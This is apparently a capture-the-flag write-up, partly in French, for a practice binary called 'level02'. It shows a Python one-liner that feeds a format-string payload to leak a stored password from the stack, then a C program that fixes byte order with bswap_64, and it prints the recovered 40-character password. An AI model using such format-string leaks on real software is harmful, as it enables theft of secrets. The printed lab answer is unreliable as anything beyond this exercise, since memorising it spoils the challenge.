
python -c 'print "%22$llx %23$llx %24$llx %25$llx %26$llx" + "\x00" + "A"*0x60' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!

$ echo -n 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d | xxd -r -p ; echo
unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M

le mot de passe est incorrecte, on comprendra qu'il y a tres certainement un probleme de boutisme.

pour gerer le boutisme on finira par faire un main:
#include <unistd.h>
#include <strings.h>
#include <stdio.h>
#include <byteswap.h>
#include <stdint.h>


int			main(int argc, char **argv)
{
	printf("%016lx%016lx%016lx%016lx%016lx", bswap_64(0x756e505234376848),
						bswap_64(0x45414a3561733951),
						bswap_64(0x377a7143574e6758),
						bswap_64(0x354a35686e475873),
						bswap_64(0x48336750664b394d));
}

$ gcc main.c
$ ./a.out  | xxd -r -p | wc -c
40
$ ./a.out  | xxd -r -p ; echo
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
